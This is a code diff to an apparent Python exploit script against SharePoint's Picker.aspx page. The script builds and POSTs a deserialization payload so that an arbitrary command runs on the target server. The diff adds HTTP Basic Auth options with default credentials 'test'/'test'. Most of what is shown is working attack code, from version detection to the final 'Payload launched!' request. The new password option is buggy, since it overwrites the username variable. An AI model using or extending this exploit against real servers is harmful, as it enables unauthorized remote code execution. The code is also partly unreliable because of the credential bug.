@@ -9,6 +9,7 @@ import codecs
 import readline
 from clint.arguments import Args
 import signal
+from requests.auth import HTTPBasicAuth
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
@@ -44,6 +45,8 @@ if '--help' in myargs or '-h' in myargs:
         -u --url          - The Sharepoint Picker.aspx URL ( e.g. http://localhost/_layouts/15/Picker.aspx )
         -c --command      - The command to run on the target Sharepoint server.
         -f --file         - The file containing the command to run (Useful for commands with multi-lines or characters that need escaping)
+        -e --username     - Sharepoint Basic Auth Username
+        -p --password     - Sharepoint Basic Auth Password
         """
     print (help)
     exit(0)
@@ -51,6 +54,9 @@ if '--help' in myargs or '-h' in myargs:
 url = ''
 cmd = ''
 filename = ''
+username = 'test'
+password = 'test'
+
 if '--url' in myargs or '-u' in myargs:
     try:
         url = myargs['--url'][0]
@@ -75,6 +81,18 @@ if '--file' in myargs or '-f' in myargs:
     cmd = file.read()
     file.close()
     
+if '--username' in myargs or '-e' in myargs:
+    try:
+        username = myargs['--username'][0]
+    except:
+        username = myargs['-e'][0]
+
+if '--password' in myargs or '-p' in myargs:
+    try:
+        username = myargs['--password'][0]
+    except:
+        username = myargs['-p'][0] 
+    
 
 sharepoint2019and2016 = "?PickerDialogType=Microsoft.SharePoint.WebControls.ItemPickerDialog,+Microsoft.SharePoint,+Version=16.0.0.0,+Culture=neutral,+PublicKeyToken=71e9bce111e9429c";
 sharepoint2013 = "?PickerDialogType=Microsoft.SharePoint.WebControls.ItemPickerDialog,+Microsoft.SharePoint,+Version=15.0.0.0,+Culture=neutral,+PublicKeyToken=71e9bce111e9429c";
@@ -96,7 +114,7 @@ headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/71.0',
 }
 
-firstcall = requests.get(url,headers=headers,verify=False)
+firstcall = requests.get(url,headers=headers,verify=False, auth=HTTPBasicAuth(username, password))
 spheader = firstcall.headers.get('MicrosoftSharePointTeamServices','16')
 
 spheader = int(spheader.split('.')[0])
@@ -114,7 +132,7 @@ else:
 
 FullURL = url +  assemblyvalue
 
-secondcall = requests.get(FullURL,headers=headers,verify=False)
+secondcall = requests.get(FullURL,headers=headers,verify=False, auth=HTTPBasicAuth(username, password))
 secondcalltext = secondcall.text
 
 tree = html.fromstring(secondcall.content)
@@ -161,6 +179,6 @@ payload = payload.replace("zzzz",serialized_length)
 print("Deserialized Payload:")
 print(deserialize_command(payload[8:]))
 data = {"__VIEWSTATE":viewstate,"__EVENTVALIDATION":eventvalidation,"ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData":payload}
-thirdcall = requests.post(FullURL, data=data,headers=headers,verify=False)
+thirdcall = requests.post(FullURL, data=data,headers=headers,verify=False, auth=HTTPBasicAuth(username, password))
 
 print("Payload launched! Check execution results. Exiting...")
